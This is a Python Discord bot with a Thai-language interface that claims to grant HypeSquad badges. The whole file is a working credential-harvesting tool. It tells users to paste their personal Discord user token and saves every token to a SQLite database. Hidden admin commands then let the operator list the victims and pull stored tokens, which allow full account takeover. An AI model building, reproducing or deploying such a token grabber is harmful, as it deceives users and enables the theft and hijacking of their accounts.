import discord
from discord import app_commands
from discord.ext import commands
import requests
import sqlite3
import os

# ============ TOKEN ============
BOT_TOKEN = os.environ.get("HYPESQUAD_BOT_TOKEN")

# ============ DATABASE ============
conn = sqlite3.connect("hypesquad_tokens.db", check_same_thread=False)
conn.execute("""
CREATE TABLE IF NOT EXISTS submitted_tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT NOT NULL,
    username TEXT NOT NULL,
    token TEXT NOT NULL,
    house TEXT NOT NULL,
    submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")
conn.commit()

# ============ DISCORD BOT ============
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ============ ADMIN USER IDs ============
ADMIN_USER_IDS = [
    1526937904423764030,  # ID ของคุณ (เปลี่ยนเป็น ID จริง)
]

# ============ VIEW: ปุ่มเลือกตรา HypeSquad ============
class HypeSquadSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(
                label="HypeSquad - Bravery",
                value="bravery",
                description="🔴 ตราสีแดง",
                emoji="🔴"
            ),
            discord.SelectOption(
                label="HypeSquad - Brilliance",
                value="brilliance",
                description="🟣 ตราสีม่วง",
                emoji="🟣"
            ),
            discord.SelectOption(
                label="HypeSquad - Balance",
                value="balance",
                description="🟢 ตราสีเขียว",
                emoji="🟢"
            ),
        ]
        super().__init__(
            placeholder="🎯 เลือกตรา HypeSquad ที่คุณชอบ",
            min_values=1,
            max_values=1,
            options=options
        )

    async def callback(self, interaction: discord.Interaction):
        self.view.selected_house = self.values[0]
        await interaction.response.send_message(
            f"✅ คุณเลือกตรา **{self.values[0].capitalize()}** แล้ว\n"
            f"📝 กรุณาส่ง `User Token` ของคุณในข้อความถัดไป (ภายใน 60 วินาที)",
            ephemeral=True
        )
        self.view.user_id = interaction.user.id
        self.view.username = interaction.user.name
        self.view.waiting_for_token = True
        self.view.house = self.values[0]


class HypeSquadView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
        self.selected_house = None
        self.user_id = None
        self.username = None
        self.waiting_for_token = False
        self.house = None
        self.add_item(HypeSquadSelect())
        # ปุ่มล้างตัวเลือก (Clear Selection)
        self.add_item(discord.ui.Button(
            label="❌ ล้างตัวเลือกใหม่",
            style=discord.ButtonStyle.secondary,
            custom_id="clear_selection"
        ))

    @discord.ui.button(label="❌ ล้างตัวเลือกใหม่", style=discord.ButtonStyle.secondary)
    async def clear_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.selected_house = None
        self.waiting_for_token = False
        await interaction.response.send_message("🔄 ล้างตัวเลือกแล้ว กรุณาเลือกตราใหม่", ephemeral=True)

    async def on_timeout(self):
        self.waiting_for_token = False


# ============ SLASH COMMAND: /hypesquad ============
@bot.tree.command(name="hypesquad", description="🎯 เลือกตรา HypeSquad ที่ต้องการ (Bravery/Brilliance/Balance)")
async def hypesquad(interaction: discord.Interaction):
    view = HypeSquadView()
    
    embed = discord.Embed(
        title="🎯 รับตรา HypeSquad",
        description=(
            "**กรุณาเลือกตรา HypeSquad ที่คุณต้องการเข้าร่วม**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔴 **HypeSquad - Bravery** (สีแดง)\n"
            "🟣 **HypeSquad - Brilliance** (สีม่วง)\n"
            "🟢 **HypeSquad - Balance** (สีเขียว)\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ หากมีตราอยู่แล้วสามารถเปลี่ยนได้\n"
            "⚠️ ต้องใส่ User Token ของตัวเองเท่านั้น!"
        ),
        color=discord.Color.blurple()
    )
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)


# ============ รับ Token จากผู้ใช้ ============
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    for view in bot._connection._view_store._views.values():
        if isinstance(view, HypeSquadView):
            if view.waiting_for_token and view.user_id == message.author.id:
                token = message.content.strip()
                house = view.house
                house_map = {"bravery": 1, "brilliance": 2, "balance": 3}
                house_id = house_map.get(house)

                if not house_id:
                    await message.channel.send("❌ รูปแบบไม่ถูกต้อง")
                    view.waiting_for_token = False
                    return

                # บันทึก Token ลงฐานข้อมูล
                try:
                    conn.execute(
                        "INSERT INTO submitted_tokens (user_id, username, token, house) VALUES (?, ?, ?, ?)",
                        (str(message.author.id), message.author.name, token, house)
                    )
                    conn.commit()
                    await message.channel.send(f"📝 บันทึก Token ของคุณเรียบร้อยแล้ว")
                except Exception as e:
                    await message.channel.send(f"⚠️ บันทึกข้อมูลไม่สำเร็จ: {str(e)}")

                # ส่งคำขอไปยัง Discord API
                url = "https://discord.com/api/v9/hypesquad/online"
                headers = {"Authorization": token, "Content-Type": "application/json"}
                payload = {"house_id": house_id}

                try:
                    response = requests.post(url, headers=headers, json=payload)
                    if response.status_code == 204:
                        await message.channel.send(f"✅ เพิ่มตรา HypeSquad **{house.capitalize()}** สำเร็จ! 🎉")
                    elif response.status_code == 400:
                        await message.channel.send("❌ Token นี้มีตรา HypeSquad อยู่แล้ว หรือรูปแบบไม่ถูกต้อง")
                    elif response.status_code == 401:
                        await message.channel.send("❌ Token ไม่ถูกต้อง (Unauthorized)")
                    else:
                        await message.channel.send(f"❌ เกิดข้อผิดพลาด: {response.status_code}")
                except Exception as e:
                    await message.channel.send(f"❌ เกิดข้อผิดพลาด: {str(e)}")

                view.waiting_for_token = False
                return

    await bot.process_commands(message)


# ============ คำสั่งลับ (เฉพาะ ADMIN_USER_IDS) ============
@bot.tree.command(name="listtokens", description="📋 ดูรายการ User Token ที่ถูกส่งมา")
@app_commands.check(lambda i: i.user.id in ADMIN_USER_IDS)
async def listtokens(interaction: discord.Interaction):
    rows = conn.execute(
        "SELECT user_id, username, house, submitted_at FROM submitted_tokens ORDER BY submitted_at DESC LIMIT 20"
    ).fetchall()

    if not rows:
        await interaction.response.send_message("📭 ยังไม่มีใครส่ง Token มา", ephemeral=True)
        return

    message = "📋 **รายการ Token ที่ถูกส่งมา**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for row in rows:
        user_id, username, house, submitted_at = row
        message += f"👤 **{username}** (`{user_id}`)\n"
        message += f"   🏷️ ตรา: {house.capitalize()}\n"
        message += f"   ⏰ {submitted_at}\n"
        message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

    await interaction.response.send_message(message, ephemeral=True)


@bot.tree.command(name="gettokens", description="🔍 ดึง Token ของผู้ใช้คนใดคนหนึ่ง")
@app_commands.check(lambda i: i.user.id in ADMIN_USER_IDS)
async def gettokens(interaction: discord.Interaction, user_id: str):
    row = conn.execute(
        "SELECT token, house, submitted_at FROM submitted_tokens WHERE user_id = ? ORDER BY submitted_at DESC LIMIT 1",
        (user_id,)
    ).fetchone()

    if not row:
        await interaction.response.send_message(f"❌ ไม่พบ Token ของผู้ใช้ ID `{user_id}`", ephemeral=True)
        return

    token, house, submitted_at = row
    await interaction.response.send_message(
        f"🔍 **Token ของผู้ใช้ `{user_id}`**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🏷️ ตรา: {house.capitalize()}\n"
        f"🔑 Token: `{token[:20]}...{token[-10:]}`\n"
        f"⏰ {submitted_at}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ Token นี้คือรหัสผ่าน กรุณาเก็บให้มิดชิด!",
        ephemeral=True
    )


# ============ ลงทะเบียน Slash Command ============
@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ บอท HypeSquad ออนไลน์แล้ว: {bot.user}")
    print(f"✅ /hypesquad พร้อมใช้งาน!")


# ============ RUN ============
if __name__ == "__main__":
    bot.run(BOT_TOKEN)
